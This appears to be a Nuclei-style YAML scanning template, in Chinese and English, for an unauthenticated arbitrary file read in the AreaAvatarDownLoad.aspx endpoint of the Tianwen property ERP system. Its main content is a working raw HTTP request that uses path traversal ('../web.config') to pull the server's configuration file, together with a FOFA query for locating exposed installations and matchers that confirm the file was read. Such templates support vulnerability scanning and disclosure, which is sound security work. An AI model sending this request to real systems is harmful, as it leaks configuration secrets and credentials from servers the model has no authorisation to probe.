id: tw369-erp-AreaAvatarDownLoad-fileread
info:
  name: 天问物业 ERP 系统 AreaAvatarDownLoad.aspx - fileread
  author: leadlife
  severity: high
  description: 天问物业ERP系统 AreaAvatarDownLoad.aspx 接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
  reference: 
    - https://blog.csdn.net/qq_39894062/article/details/140611927
    - https://mp.weixin.qq.com/s?__biz=Mzg4Njg3MDk5Ng==&mid=2247486671&idx=1&sn=a8cac0ea09f0581677017806c07be7b2
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
  tags: tw369, fileread


http:
  - raw:
      - |
        GET /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'configuration','web.config')
        condition: and